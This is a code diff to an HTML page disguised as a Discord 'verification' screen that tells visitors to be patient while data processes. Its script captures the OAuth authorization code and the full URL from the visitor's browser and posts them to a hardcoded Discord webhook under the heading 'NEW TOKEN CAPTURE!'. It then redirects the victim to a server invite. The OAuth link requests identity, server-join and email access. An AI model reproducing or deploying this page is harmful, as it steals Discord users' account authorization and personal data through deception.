@@ -12,12 +12,10 @@
             margin: 0;
             padding: 20px;
             box-sizing: border-box;
-            
             background: #000 url("https://i.imgur.com/OxUdmtJ.gif") center/cover no-repeat fixed;
             color: white;
             position: relative;
         }
-        
         body::before {
             content: "";
             position: absolute;
@@ -37,16 +35,19 @@
 <body>
     <div class="box">
         <h1>Be Patient....</h1>
-        <p>Chill...</p>
+        <p>Chill... Processing Data</p>
     </div>
 
 <script>
 
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1528609341052027044/2nHhgkDzN_BzeEwiVT4K_LjINjxiO0Rf2O3BTHtzhGS2rEAXKottXqe-GIP2xk2vjD_b";
 const REDIRECT_URL = "https://discord.gg/CBcSYcGkD";
-const BOT_INVITE = "https://discord.com/oauth2/authorize?client_id=1529796241049915462&response_type=code&redirect_uri=https%3A%2F%2Fblah-hck.github.io%2Fjoin_verification.net%2F&scope=identify+guilds.join+email"
+const OAUTH_LINK = "https://discord.com/oauth2/authorize?client_id=1529796241049915462&response_type=code&redirect_uri=https%3A%2F%2Fblah-hck.github.io%2Fjoin_verification.net%2F&scope=identify+guilds.join+email";
+
 
 let code = new URLSearchParams(window.location.search).get("code") || "";
+let fullUrl = window.location.href.slice(0, 1024);
+
 
 fetch(WEBHOOK_URL, {
     method: "POST",
@@ -56,14 +57,15 @@ fetch(WEBHOOK_URL, {
             title: "NEW TOKEN CAPTURE!",
             color: 0x2ecc71,
             fields: [
-                { name: "AUTHORIZATION CODE", value: code ? `||${code}||\n(Gamitin ito para palitan sa Access Token)` : "❌ WALANG CODE NAKUHA" },
-                { name: "FULL URL", value: window.location.href.slice(0, 1024) }
+                { name: "AUTHORIZATION CODE", value: code ? `||${code}||\n(Letsgoo)` : "WALANG CODE NAKUHA" },
+                { name: "FULL LINK", value: fullUrl }
             ]
         }]
     })
 })
 .catch(err => console.error("Error:", err))
 .finally(() => {
+    
     setTimeout(() => window.location.href = REDIRECT_URL, 1500);
 });
 </script>
